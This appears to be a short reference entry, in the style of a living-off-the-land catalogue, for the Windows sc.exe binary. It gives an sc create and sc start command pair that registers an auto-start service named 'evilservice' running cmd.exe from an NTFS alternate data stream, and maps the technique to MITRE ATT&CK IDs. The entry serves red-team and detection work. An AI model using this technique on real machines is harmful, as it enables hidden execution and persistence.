## SC.exe

* Functions: Execute, Read ADS, Create Service, Start Service

```
sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto     
sc start evilservice     

```

Acknowledgements:
* Oddvar Moe - @oddvarmoe

Code sample:
* 

Resources:
* https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/

Full path:
```
c:\windows\system32\sc.exe
c:\windows\sysWOW64\sc.exe
```

Notes:



 
MITRE ATT&CK:
* [Service Registry Permissions Weakness](https://attack.mitre.org/wiki/Technique/T1058)
* [System Service Discovery](https://attack.mitre.org/wiki/Technique/T1007)
* [Service Execution](https://attack.mitre.org/wiki/Technique/T1035)
* [Modify Existing Service](https://attack.mitre.org/wiki/Technique/T1031)
* [NTFS File Attributes](https://attack.mitre.org/wiki/Technique/T1096)
* [New Service](https://attack.mitre.org/wiki/Technique/T1050)
